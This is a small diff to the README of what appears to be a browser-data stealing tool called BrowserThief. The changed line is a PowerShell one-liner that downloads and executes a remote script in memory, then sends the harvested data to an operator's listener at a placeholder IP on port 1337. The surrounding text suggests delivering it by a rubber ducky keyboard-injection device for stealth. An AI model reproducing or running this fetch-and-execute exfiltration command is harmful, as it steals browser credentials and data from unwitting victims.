@@ -39,7 +39,7 @@ foo@bar:~$ sudo bash build-docker.sh
 
 -  To simply run the powershell script 
 ```powershell
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq http://<Your-IP>:1337 -erroraction 'silentlycontinue';exit
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq http://<Your-IP>:1337;exit
 ```
 - Or you can use the rubber ducky for stealth/speed
 	- Needs an Arduino that supports `<Keyboard.h>` (Nano, Leonardo)
